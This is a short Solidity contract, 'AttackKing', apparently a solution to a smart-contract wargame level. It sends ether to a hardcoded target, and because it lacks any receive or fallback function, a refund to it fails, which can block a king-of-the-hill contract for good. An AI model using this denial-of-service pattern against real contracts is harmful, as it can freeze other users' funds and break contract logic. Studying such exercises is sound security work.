// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

contract AttackKing {
    address payable instance = payable(0x5fcA75D65D95f300858503aA75De9C1A004b01bb);

    constructor() {}
    function attack() payable external {
       (bool success, ) = instance.call{value: msg.value}("");
       require(success, "Failed");
    }

}